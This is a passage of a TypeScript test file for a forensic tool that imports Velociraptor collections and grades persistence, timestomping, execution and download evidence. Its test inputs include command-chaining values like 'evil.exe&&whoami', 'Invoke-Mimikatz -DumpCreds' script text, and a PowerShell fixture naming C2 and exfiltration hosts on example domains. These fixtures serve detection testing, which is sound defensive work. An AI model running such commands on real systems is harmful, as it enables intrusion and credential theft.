      "C:\\ProgramData\\evil.exe&&whoami",
      "C:\\ProgramData\\evil.exe|more",
      "C:\\ProgramData\\evil.exe>out.txt",
      "C:\\ProgramData\\evil.exe;whoami",
    ]) {
      const e = parseVelociraptorJson(JSON.stringify([sniperRow({ Value: value })])).events[0];
      expect(e.description, value).toContain("[staged:");
      expect(e.severity, value).toBe("High");
    }
  });

  // Real-world false positive: scanning for the staging shape ANYWHERE in the raw text (tried and
  // reverted) matched an UNRELATED reference inside an argument to a completely different, benign
  // executable — a very common auto-updater pattern where msiexec.exe installs a package it staged
  // in Temp itself. msiexec.exe is what's actually running (not staged); the .msi path is ordinary
  // data passed to it, not the persistence technique's own target.
  it("does not flag a Temp-staged file referenced only as an argument to an unrelated executable", () => {
    for (const value of [
      "msiexec.exe /i C:\\Windows\\Temp\\GoogleUpdate.msi /quiet",
      "msiexec.exe /i C:\\Users\\bob\\AppData\\Local\\Temp\\update.msi",
    ]) {
      const e = parseVelociraptorJson(JSON.stringify([sniperRow({ Value: value })])).events[0];
      expect(e.description, value).not.toContain("[staged:");
      expect(e.severity, value).toBe("Info");
    }
  });

  it("still detects a quoted staged payload after a launcher prefix with real intermediate path segments", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Value: 'app.exe "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.dll"' })]),
    ).events[0];
    expect(e.description).toContain("[staged:");
    expect(e.severity).toBe("High");
  });

  // Grading reads the module's own structured IsLolbin/Signature columns directly — never the
  // rendered description, which mixes in Value/Path (real content from the target host that an
  // adversary can shape). A tagger rule that re-parsed the description for a "[lolbin]"/
  // "[signature: ...]" substring was tried first and reverted for exactly this reason.
  it("is not spoofed by a Value that fakes the [lolbin] marker text (IsLolbin: False)", () => {
    // An ordinary Program Files location — isolates the [lolbin]-text spoofing concern from the
    // legitimate "staged in Temp/AppData" signal (that path shape is deliberately graded up).
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ IsLolbin: "False", Value: "C:\\Program Files\\App\\name[lolbin].exe" })]),
    ).events[0];
    expect(e.description).toContain("name[lolbin].exe");
    expect(e.severity).toBe("Info");
  });

  it("is not spoofed by a Value that fakes the [signature: ...] marker text (clean signature)", () => {
    // An ordinary Program Files location — isolates the [signature:]-text spoofing concern from the
    // legitimate "staged in Temp" signal (that path shape is deliberately graded up on its own).
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Value: "C:\\Program Files\\App\\evil [signature: NotSigned].exe",
          Signature: "Status = Valid, Subject = CN=Contoso",
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("Info");
  });

  // The description is capped at 600 chars (withHostSuffix + .slice(0, 600)) — a long Path/subject
  // could push a marker built AFTER that cap out of the rendered text. Grading must not depend on
  // the marker surviving truncation.
  it("still grades High when a long Technique would truncate the [lolbin] marker out of the description", () => {
    // Technique (unlike Value/Path) isn't length-capped before being embedded, so a long enough
    // value pushes everything appended after it — including the [lolbin] marker — past the
    // description's final .slice(0, 600).
    const longTechnique = "Scheduled Task ".repeat(50).trim();
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ IsLolbin: "True", Technique: longTechnique })]),
    ).events[0];
    expect(e.description).not.toContain("[lolbin]"); // confirms the marker really was truncated away
    expect(e.severity).toBe("High"); // ...yet grading still fired, because it never depended on it
  });

  it("does not choke on an empty Signature struct (no cert info available)", () => {
    const desc = parseVelociraptorJson(JSON.stringify([sniperRow({ Signature: "Status = , Subject = " })]))
      .events[0].description;
    expect(desc).not.toContain("Status =");
  });

  it("extracts the MITRE technique id from Classification", () => {
    const e = parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0];
    expect(e.mitreTechniques).toContain("T1053.005");
  });

  it("adds an unquoted Value with no arguments to split on as a file IOC", () => {
    const row = sniperRow({ Value: "C:\\Windows\\System32\\evil.dll" });
    const iocs = parseVelociraptorJson(JSON.stringify([row])).iocs;
    expect(iocs.some((i) => i.type === "file" && i.value === "C:\\Windows\\System32\\evil.dll")).toBe(true);
  });

  it("trusts an explicitly quoted path over any extension/switch guessing", () => {
    const row = sniperRow({ Value: '"C:\\Program Files\\Odd - Name.new\\thing.exe" -y' });
    const iocs = parseVelociraptorJson(JSON.stringify([row])).iocs;
    const file = iocs.find((i) => i.type === "file" && i.value.includes("thing.exe"));
    expect(file?.value).toBe("C:\\Program Files\\Odd - Name.new\\thing.exe");
  });

  it("does not fabricate a file IOC by guessing a split point in an unquoted path+argument value (invalid-IOC regression)", () => {
    // The real case data's own Value — a legitimate path (with a space in "Program Files (x86)")
    // plus a trailing "/c" argument glued on with no delimiter. Every split-point guess tried here
    // (whitespace+separator, extension-anchored) eventually fabricated a truncated or concatenated
    // non-existent path for SOME real layout ("Suite -64-bit", comma-joined AppInit_DLLs values,
    // …) — so this deliberately extracts NOTHING from an unquoted value once whitespace is present,
    // rather than guess. The title still shows the full raw value (see the title-formatting tests
    // above); only structured IOC extraction is this conservative.
    const iocs = parseVelociraptorJson(JSON.stringify([sniperRow()])).iocs;
    expect(iocs.some((i) => i.type === "file" && i.value.includes("MicrosoftEdgeUpdate"))).toBe(false);
  });

  it("does not concatenate a comma-joined multi-value Value into one fabricated file IOC", () => {
    // AppInit_DLLs / Security Packages / Authentication Packages style values list several DLLs in
    // one string. No character in "C:\evil1.dll,C:\evil2.dll" says where value 1 ends and value 2
    // begins, so treating the whole thing as one file path would be its own invalid IOC.
    const row = sniperRow({ Value: "C:\\Windows\\evil1.dll,C:\\Windows\\evil2.dll" });
    const iocs = parseVelociraptorJson(JSON.stringify([row])).iocs;
    expect(iocs.some((i) => i.type === "file" && i.value.includes("evil1.dll,C"))).toBe(false);
  });

  it("falls back to Path when a technique has no Value (e.g. a registry run key)", () => {
    const row = sniperRow({
      Technique: "Registry Run Key",
      Classification: "MITRE ATT&CK T1547.001",
      Path: "HKEY_USERS\\S-1-5-21-843861673-2156981796-2677025539-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeAutoLaunch",
      Value: "",
    });
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("MicrosoftEdgeAutoLaunch");
  });

  it("is classified by column detection when _Source is absent", () => {
    const row = sniperRow();
    delete (row as Record<string, unknown>)._Source;
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("Scheduled Task");
  });

  it("sets severity to Info (raw finding listing, not a detection)", () => {
    expect(parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0].severity).toBe("Info");
  });
});

describe("parseVelociraptorJson — InUse field in MFT detection rows", () => {
  function mftRow(inUse: boolean): object {
    return {
      _Source: "DetectRaptor.Windows.Detection.MFT",
      Detection: { Name: "Credential Theft", Criticality: "High" },
      InUse: inUse,
      OSPath: "\\\\.\\C:\\Tools\\NirLauncher\\NirSoft\\ChromePass.cfg",
      SITimestamps: { Created0x10: "2026-06-13T17:51:20Z", LastModified0x10: "2026-06-13T17:51:20Z" },
    };
  }

  it("does NOT append [deleted] when InUse is true", () => {
    const desc = parseVelociraptorJson(JSON.stringify([mftRow(true)])).events[0].description;
    expect(desc).not.toContain("[deleted]");
    expect(desc).toContain("Credential Theft");
  });

  it("appends [deleted] to description when InUse is false", () => {
    const desc = parseVelociraptorJson(JSON.stringify([mftRow(false)])).events[0].description;
    expect(desc).toContain("[deleted]");
    expect(desc).toContain("Credential Theft");
  });

  it("handles string 'false' for InUse", () => {
    const row = { ...mftRow(true), InUse: "false" };
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("[deleted]");
  });
});

describe("parseVelociraptorJson — hostFallback (single-client flow attribution)", () => {
  it("uses hostFallback as the asset when a row carries no host", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [
        { OSPath: "C:\\evil.exe", Created0x10: "2026-06-01T00:00:00Z", FileName: "evil.exe" },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT", hostFallback: "DESKTOP-01" });
    expect(r.events.length).toBeGreaterThan(0);
    expect(r.events.every((e) => e.asset === "DESKTOP-01")).toBe(true);
  });

  it("keeps a row's own host over hostFallback", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [{ OSPath: "C:\\x", Created0x10: "2026-06-01T00:00:00Z", Computer: "SERVER-9" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT", hostFallback: "DESKTOP-01" });
    const withHost = r.events.find((e) => e.asset);
    expect(withHost?.asset).toBe("SERVER-9");
  });
});

describe("parseVelociraptorJson — bare NTFS/MFT timestamps", () => {
  it("dates an MFT row from bare top-level $FN Created (0x30), preferred over $SI Created (0x10)", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [
        {
          OSPath: "C:\\Windows\\evil.exe",
          FileName: "evil.exe",
          Created0x10: "2021-01-01T00:00:00Z", // $SI (timestompable)
          Created0x30: "2026-06-02T09:15:00Z", // $FN (preferred)
        },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events.length).toBeGreaterThan(0);
    expect(r.events[0].timestamp).toBe("2026-06-02T09:15:00Z"); // used Created0x30, not epoch/blank
  });

  it("falls back to $SI Created (0x10) when there's no $FN Created", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [{ OSPath: "C:\\x", FileName: "x", Created0x10: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events[0].timestamp).toBe("2026-06-01T00:00:00Z");
  });
});

describe("parseVelociraptorJson — NTFS timestomp detection (T1070.006)", () => {
  it("flags an MFT row whose $SI creation is backdated far before $FN creation", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [
        {
          OSPath: "C:\\Windows\\System32\\evil.exe",
          FileName: "evil.exe",
          Created0x10: "2009-07-14T01:14:24.0000000Z", // $SI backdated to look like an old system file
          Created0x30: "2026-06-02T09:15:23.4821330Z", // $FN keeps the real (recent) creation time
        },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    const hit = r.events.find((e) => e.mitreTechniques.includes("T1070.006"));
    expect(hit, "expected a timestomp-tagged event").toBeTruthy();
    expect(hit?.severity).toBe("Medium");
    expect(hit?.description).toMatch(/timestomping/i);
  });

  it("does NOT flag a normal MFT row where $SI and $FN creation agree", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [
        {
          OSPath: "C:\\Users\\bob\\report.docx",
          FileName: "report.docx",
          Created0x10: "2026-06-02T09:15:20.1112223Z",
          Created0x30: "2026-06-02T09:15:20.1112223Z",
        },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events.every((e) => !e.mitreTechniques.includes("T1070.006"))).toBe(true);
    expect(r.events.every((e) => e.severity === "Info")).toBe(true);
  });

  it("reads $SI/$FN nested under SITimestamps/FNTimestamps too", () => {
    const text = JSON.stringify({
      "Windows.NTFS.MFT": [
        {
          OSPath: "C:\\ProgramData\\svc.dll",
          FileName: "svc.dll",
          SITimestamps: { Created0x10: "2012-01-01T00:00:00.0000000Z" },
          FNTimestamps: { Created0x30: "2026-06-02T09:15:23.4821330Z" },
        },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events.some((e) => e.mitreTechniques.includes("T1070.006"))).toBe(true);
  });
});

describe("parseVelociraptorJson — timestamp coverage for raw artifacts", () => {
  it("dates a Chrome/Edge history row from visit_time", () => {
    const text = JSON.stringify({
      "Windows.Applications.Chrome.History": [
        {
          url: "http://evil.test/x",
          title: "x",
          visit_time: "2026-06-04T12:00:00Z",
          OSPath: "C:\\...\\History",
        },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Applications.Chrome.History" });
    expect(r.events[0].timestamp).toBe("2026-06-04T12:00:00Z");
  });

  it("dates a row via the name-based fallback for a time column not in the explicit list", () => {
    // A shellbags-style row whose only time is an unlisted, time-NAMED column → the fallback scan dates it.
    const text = JSON.stringify({
      "Windows.Forensics.Shellbags": [
        { Path: "Desktop\\evil", ShellbagModifiedTime: "2026-06-05T08:00:00Z" },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Forensics.Shellbags" });
    expect(r.events[0].timestamp).toBe("2026-06-05T08:00:00Z");
  });

  it("prefers a real artifact time over the _ts collection time", () => {
    const text = JSON.stringify({
      "Windows.Applications.Chrome.History": [
        { url: "http://x", visit_time: "2026-06-01T00:00:00Z", _ts: 1893456000 },
      ],
    });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Applications.Chrome.History" });
    expect(r.events[0].timestamp).toBe("2026-06-01T00:00:00Z"); // visit_time, not the _ts epoch
  });

  it("uses _ts only as an absolute last resort (no real time anywhere)", () => {
    const text = JSON.stringify({ "Custom.Thing": [{ foo: "bar", _ts: 1893456000 }] }); // 2030-01-01
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing" });
    expect(r.events[0].timestamp).toBe("2030-01-01T00:00:00.000Z");
  });

  it("ignores a 1601/epoch-0 sentinel in a fallback-scanned column (stays undated rather than year 1601)", () => {
    const text = JSON.stringify({ "Custom.Thing": [{ foo: "bar", SomeTime: "1601-01-01T00:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing" });
    expect(r.events[0].timestamp).toBe("");
  });

  it("carries the full untruncated message beyond the truncated description (#9)", () => {
    // A rendered EVTX-style message far longer than the 600-char description cap: `message` must carry
    // the FULL text so the super-timeline row can reveal it expandably, while `description` stays short.
    const longMsg = "ScriptBlock: " + "Invoke-Mimikatz -DumpCreds; ".repeat(60) + "END";
    const text = JSON.stringify({
      "Custom.PSScript": [{ Message: longMsg, SomeTime: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
    const ev = r.events[0];
    expect(ev.message).toBeTruthy();
    expect((ev.message as string).length).toBeGreaterThan(ev.description.length);
    expect(ev.message).toContain("END"); // the tail past the description cut-off survives
    expect(ev.description.length).toBeLessThanOrEqual(600); // description stays the short summary
  });

  // ── The message cap. A PowerShell script long enough to be cut kept its C2 table in the
  // half that was cut, so the stored event named no attacker infrastructure at all — on a real case
  // (INC-2026-001) 181 events each held exactly 4,001 characters of module boilerplate and not one
  // C2 host. The cap itself stays: the forensic timeline feeds AI synthesis and the cap is what
  // bounds it. What must not stay is the SILENCE about what the cap removed.
  //
  // A message whose indicators sit on both sides of the cut, so the assertions can tell "kept" apart
  // from "disclosed". The filler is deliberately indicator-free.
  const PRE_CUT_DOMAIN = "staging-pre.example.com";
  const PRE_CUT_IP = "198.51.100.9";
  const POST_CUT_DOMAIN = "workspacin-post.example.net";
  const POST_CUT_IP = "203.0.113.77";
  function splitIndicatorScript(): string {
    const head = `ScriptBlock: Invoke-WebRequest ${PRE_CUT_DOMAIN} ; $peer = "${PRE_CUT_IP}"\n`;
    const filler = "Write-Host 'benign module boilerplate line' ; ".repeat(200);
    const tail = `\n$C2 = @("${POST_CUT_DOMAIN}") ; $ExfilIp = "${POST_CUT_IP}"`;
    return head + filler + tail;
  }

  it("keeps the post-cut indicators discoverable from the stored event", () => {
    const raw = splitIndicatorScript();
    expect(raw.length).toBeGreaterThan(4000); // the fixture must actually reach the cap
    expect(raw.indexOf(POST_CUT_DOMAIN)).toBeGreaterThan(4000); // …and hide its C2 table past it
    const text = JSON.stringify({
      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
    const message = r.events[0].message as string;

    // What the analyst reads before the cut is unchanged.
    expect(message).toContain(PRE_CUT_DOMAIN);
    expect(message).toContain(PRE_CUT_IP);
    // The body is still capped — this is a disclosure, not a raised ceiling.
    expect(message.slice(0, 4001)).toBe(`${raw.slice(0, 4000)}\u2026`);
    // The note is a short disclosure, not the rest of the script smuggled back in.
    expect(message.length).toBeLessThan(4001 + 800);
    // And the indicators the cut removed are named, with the size of the cut.
    expect(message).toContain(POST_CUT_DOMAIN);
    expect(message).toContain(POST_CUT_IP);
    expect(message).toContain(`${raw.length - 4000} more characters`);
  });

  it("recovers a C2 domain the cut split in half", () => {
    // The cap counts characters, not tokens, so it lands mid-domain as readily as between two.
    // Scanning only what was dropped reports a suffix that never existed ("er.example.net"), which
    // an analyst can pivot on and find nothing. Position the fixture so the cut falls inside the
    // domain itself.
    const STRADDLER = "c2-straddler.example.net";
    const head = "ScriptBlock: Write-Host 'x' ; ";
    const filler = "Write-Host 'benign module boilerplate line' ; ".repeat(200);
    const cutAt = 4000 - 12; // 12 characters of the domain stay above the cap, the rest is dropped
    const raw = `${head}${filler}`.slice(0, cutAt) + STRADDLER + " was the beacon target";
    expect(raw.indexOf(STRADDLER)).toBeLessThan(4000);
    expect(raw.indexOf(STRADDLER) + STRADDLER.length).toBeGreaterThan(4000); // genuinely split

    const text = JSON.stringify({
      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
    const message = r.events[0].message as string;
    // The note names the WHOLE domain, not the half that fell past the cap.
    expect(message.slice(4001)).toContain(STRADDLER);
    expect(message.slice(4001)).not.toContain("er.example.net was");
  });

  it("leaves a message that fits the cap exactly as it was", () => {
    // No cut ⇒ nothing to disclose. A note on an untruncated message would be noise on every row.
    const raw = `ScriptBlock: ${"Write-Host 'x' ; ".repeat(50)}${POST_CUT_DOMAIN}`;
    expect(raw.length).toBeLessThan(4000);
    const text = JSON.stringify({
      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
    expect(r.events[0].message).toBe(raw);
    expect(r.events[0].message).not.toContain("more characters");
  });

  it("does NOT set message when the description already contains the whole thing (#9)", () => {
    // A short message wholly inside the (uncapped) description adds nothing to reveal → message stays unset.
    const text = JSON.stringify({
      "Custom.Thing": [{ Message: "short benign line", SomeTime: "2026-06-01T00:00:00Z" }],
    });
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing", aggregate: false });
    expect(r.events[0].message).toBeUndefined();
  });
});

describe("parseVelociraptorJson — IOC provenance", () => {
  // Modeled on the "download rows (Zone.Identifier / BrowserDownloads)" fixture above (mapDownload
  // reads DownloadedFilePath/Mtime/HostUrl/ReferrerUrl, not URL/Referrer/Path).
  // `Message` is populated so rowMessage()/msgFingerprint() actually produce a non-empty fingerprint
  // (see rowMessage() in velociraptorImport.ts, which reads Message/Details/message) — otherwise the
  // `if (fp) m.aggKey = ...` fold line never runs and these tests can't detect it being skipped/reordered.
  function downloadRow(overrides: object = {}): object {
    return {
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload.exe",
      Mtime: "2026-01-01T00:00:00Z",
      HostUrl: "http://evil.example.com/payload.exe",
      ReferrerUrl: "",
      Message: "User downloaded payload.exe from evil.example.com via browser",
      ...overrides,
    };
  }

  it("tags a download URL IOC's sourceAggKeys with its event's (post-fingerprint) aggKey", () => {
    const parsed = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(parsed.events).toHaveLength(1);
    // Prove the fold actually ran (not just that both sides read the same already-computed field,
    // which would also pass if mergeRowIocs ran BEFORE the fingerprint fold).
    expect(parsed.events[0].aggKey).toMatch(/\|m:/);
    const urlIoc = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil.example.com"));
    expect(urlIoc?.sourceAggKeys).toEqual([parsed.events[0].aggKey]);
    expect(urlIoc?.sourceAggKeys?.[0]).toMatch(/\|m:/);
  });

  it("tags two different rows' IOCs with their own distinct (post-fingerprint) aggKeys", () => {
    const rowA = downloadRow({
      HostUrl: "http://evil-a.example.com/payload.exe",
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload-a.exe",
      Mtime: "2026-01-01T00:00:00Z",
    });
    const rowB = downloadRow({
      HostUrl: "http://evil-b.example.com/payload.exe",
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload-b.exe",
      Mtime: "2026-01-01T00:05:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([rowA, rowB]));
    const iocA = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil-a.example.com"));
    const iocB = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil-b.example.com"));
    expect(iocA?.sourceAggKeys?.length).toBe(1);
    expect(iocB?.sourceAggKeys?.length).toBe(1);
    expect(iocA?.sourceAggKeys?.[0]).not.toEqual(iocB?.sourceAggKeys?.[0]);
  });
});

describe("parseVelociraptorJson — USN change-journal rows carry the operation (Reason)", () => {
  // A Windows.Forensics.Usn row: the Reason array IS the "what happened".
  function usnRow(reason: string[], ospath: string): object {
    return {
      _Source: "Windows.Forensics.Usn",
      Timestamp: "2025-12-05T03:12:59Z",
      OSPath: ospath,
      Reason: reason,
      Usn: 327155712,
      MFTId: 70579,
    };
  }

  it("puts the USN Reason in the description instead of a path-only event", () => {
    const r = parseVelociraptorJson(JSON.stringify([usnRow(["DATA_EXTEND", "FILE_CREATE"], "C:\\evil.exe")]));
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain("DATA_EXTEND, FILE_CREATE"); // the operation, joined
    expect(e.description).toContain("C:\\evil.exe"); // still names the file
    expect(e.description).toContain("[Windows.Forensics.Usn]"); // artifact provenance
    expect(e.path).toBe("C:\\evil.exe");
  });

  it("keeps a CREATE and a DELETE on the same path as SEPARATE events (Reason is in the agg key)", () => {
    const rows = [usnRow(["FILE_CREATE"], "C:\\a\\x.txt"), usnRow(["FILE_DELETE", "CLOSE"], "C:\\a\\x.txt")];
    const r = parseVelociraptorJson(JSON.stringify(rows), { aggregate: true });
    expect(r.events).toHaveLength(2); // would have collapsed to 1 before (Reason wasn't in the key)
    const reasons = r.events.map((e) => e.description).join(" | ");
    expect(reasons).toContain("FILE_CREATE");
    expect(reasons).toContain("FILE_DELETE");
  });

  it("tolerates a Reason emitted as a bare string", () => {
    const row = {
      _Source: "Windows.Forensics.Usn",
      Timestamp: "2025-12-05T03:12:59Z",
      OSPath: "C:\\b.txt",
      Reason: "FILE_CREATE",
      Usn: 1,
    };
    const e = parseVelociraptorJson(JSON.stringify([row])).events[0];
    expect(e.description).toContain("FILE_CREATE");
  });
});

describe("parseVelociraptorJson — MFT rows expand to a labeled MACB timeline", () => {
  // A Windows.NTFS.MFT entry with distinct $SI timestamps: born long ago, modified/accessed later.
  function mftRow(): object {
    return {
      _Source: "Windows.NTFS.MFT",
      EntryNumber: 42,
      OSPath: "C:\\Users\\v\\report.docx",
      FileName: "report.docx",
      Created0x10: "2024-01-01T00:00:00Z",
      LastModified0x10: "2025-06-01T00:00:00Z",
      LastRecordChange0x10: "2025-06-01T00:00:00Z",
      LastAccess0x10: "2025-06-02T00:00:00Z",
    };
  }

  it("emits one event per DISTINCT timestamp, each labeled with its MACB attributes", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow()]), { aggregate: true });
    // three distinct times: born (2024-01-01), modified+changed (2025-06-01), accessed (2025-06-02)
    expect(r.events).toHaveLength(3);
    const byTime = new Map(r.events.map((e) => [e.timestamp.slice(0, 10), e.description]));
    expect(byTime.get("2024-01-01")).toContain("$SI:...b"); // born only
    expect(byTime.get("2025-06-01")).toContain("$SI:m.c."); // modified + record-changed share a time
    expect(byTime.get("2025-06-02")).toContain("$SI:.a.."); // accessed
    for (const e of r.events) expect(e.path).toBe("C:\\Users\\v\\report.docx");
  });

  it("surfaces a modification that the old creation-only event would have hidden", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow()]));
    const times = r.events.map((e) => e.timestamp.slice(0, 10)).sort();
    expect(times).toContain("2025-06-01"); // the modification is now on the timeline
    expect(times).toContain("2025-06-02"); // and the access
  });

  it("collapses a file whose timestamps are all equal into a single event", () => {
    const row = {
      _Source: "Windows.NTFS.MFT",
      EntryNumber: 7,
      OSPath: "C:\\x",
      FileName: "x",
      Created0x10: "2025-01-01T00:00:00Z",
      LastModified0x10: "2025-01-01T00:00:00Z",
      LastRecordChange0x10: "2025-01-01T00:00:00Z",
      LastAccess0x10: "2025-01-01T00:00:00Z",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].description).toContain("$SI:macb"); // all four share the one timestamp
  });

  it("skips 1601/epoch 'unset' MFT timestamps rather than dating events to the year 1601", () => {
    const row = {
      _Source: "Windows.NTFS.MFT",
      EntryNumber: 9,
      OSPath: "C:\\y",
      FileName: "y",
      Created0x10: "2025-03-03T00:00:00Z",
      LastModified0x10: "1601-01-01T00:00:00Z",
      LastAccess0x10: "1601-01-01T00:00:00Z",
      LastRecordChange0x10: "1601-01-01T00:00:00Z",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp.slice(0, 4)).toBe("2025");
  });
});

describe("parseVelociraptorJson — forensic artifacts lead with the action, not a bare path", () => {
  const one = (row: object) => parseVelociraptorJson(JSON.stringify([row])).events[0];

  it("browser history → Visited <url> (title + count), not the History DB file path", () => {
    const e = one({
      _Source: "Windows.Applications.Chrome.History",
      visited_url: "https://evil.example.com/x",
      title: "Evil",
      visit_count: 4,
      visit_time: "2026-07-02T11:47:02Z",
      OSPath: "C:\\Users\\v\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
    });
    expect(e.description).toContain("Visited");
    expect(e.description).toContain("https://evil.example.com/x");
    expect(e.description).toContain("(4×)");
    expect(e.description).not.toContain("Default\\History"); // the DB file path is gone
  });

  it("shellbags → Folder browsed: <folder>, not the raw BagMRU registry key", () => {
    const e = one({
      _Source: "Windows.Forensics.Shellbags",
      KeyPath: "Software\\Microsoft\\Windows\\Shell\\BagMRU",
      Slot: "0",
      FullPath: "Computers and Devices -> vmware-host -> Apps",
      _RawData: "FAAfWA==",
      ModTime: "2026-07-02T18:47:35Z",
    });
    expect(e.description).toContain("Folder browsed");
    expect(e.description).toContain("Computers and Devices -> vmware-host -> Apps");
    expect(e.description).not.toContain("BagMRU");
  });

  it("UserAssist → Ran (UserAssist): <program> with the run count", () => {
    const e = one({
      _Source: "Windows.Registry.UserAssist",
      Name: "C:\\Tools\\mimikatz.exe",
      NumberOfExecutions: 3,
      LastExecution: "2026-07-02T12:00:00Z",
      User: "v",
    });
    expect(e.description).toContain("Ran (UserAssist)");
    expect(e.description).toContain("mimikatz.exe");
    expect(e.description).toContain("(3×)");
  });

  it("AppCompatCache → Execution evidence (Shimcache): <binary path>, not a field dump", () => {
    const e = one({
      _Source: "Windows.Registry.AppCompatCache",
      Position: 2,
      ExecutionFlag: 1,
      Path: "C:\\Temp\\evil.exe",
      ModificationTime: "2026-04-29T23:23:31Z",
      ControlSet: "ControlSet001",
    });
    expect(e.description).toContain("Execution evidence (Shimcache)");
    expect(e.description).toContain("C:\\Temp\\evil.exe");
    expect(e.description).not.toContain("Position=");
    expect(e.path).toBe("C:\\Temp\\evil.exe");
  });

  it("Amcache InventoryApplication → Installed program (Amcache): <name v ver>", () => {
    const e = one({
      _Source: "Windows.Forensics.Amcache/InventoryApplication",
      Name: "7-Zip 19.00",
      Version: "19.00",
      Publisher: "Igor Pavlov",
      InstallDate: "12/05/2025 00:00:00",
      Timestamp: "2025-12-05T02:44:30Z",
    });
    expect(e.description).toContain("Installed program (Amcache)");
    expect(e.description).toContain("7-Zip 19.00");
    expect(e.timestamp.slice(0, 4)).toBe("2025"); // ISO Timestamp, not the US InstallDate string
  });

  it("Amcache InventoryApplicationFile → Program file present (Amcache): <path> + SHA1 ioc", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        {
          _Source: "Windows.Forensics.Amcache/InventoryApplicationFile",
          Name: "7z.exe",
          OriginalFileName: "7z.exe",
          BinaryType: "pe32_i386",
          FullPath: "c:\\windows\\installer\\7z.exe",
          SHA1: "e8dcddb302f01d51da3bcbfa6707d025a896aa57",
          Timestamp: "2025-12-05T02:44:30Z",
        },
      ]),
    );
    const e = r.events[0];
    expect(e.description).toContain("Program file present (Amcache)");
    expect(e.description).toContain("c:\\windows\\installer\\7z.exe");
    expect(
      r.iocs.some((i) => i.type === "hash" && i.value === "e8dcddb302f01d51da3bcbfa6707d025a896aa57"),
    ).toBe(true);
  });

  it("Prefetch → Executed (prefetch) (N×): <executable>, not the .pf file path", () => {
    const e = one({
      _Source: "Windows.Forensics.Prefetch",
      Executable: "MIMIKATZ.EXE",
      RunCount: 6,
      ExecutablePath: "\\DEVICE\\HARDDISKVOLUME4\\TEMP\\MIMIKATZ.EXE",
      LastRunTimes: ["2026-07-02T12:16:39Z"],
      OSPath: "C:\\Windows\\Prefetch\\MIMIKATZ.EXE-3B54.pf",
    });
    expect(e.description).toContain("Executed (prefetch)");
    expect(e.description).toContain("(6×)");
    expect(e.description).toContain("MIMIKATZ.EXE");
    expect(e.description).not.toContain(".pf");
    expect(e.timestamp.slice(0, 10)).toBe("2026-07-02");
  });

  it("Prefetch → the binary's NAME is graded: mimikatz High, csc.exe Medium, notepad stays Info", () => {
    const evil = one({
      _Source: "Windows.Forensics.Prefetch",
      Executable: "MIMIKATZ.EXE",
      RunCount: 6,
      ExecutablePath: "\\DEVICE\\HARDDISKVOLUME4\\TEMP\\MIMIKATZ.EXE",
      LastRunTimes: ["2026-07-02T12:16:39Z"],
    });
    expect(evil.severity).toBe("High");
    expect(evil.mitreTechniques ?? []).toContain("T1003.001");

    const csc = one({
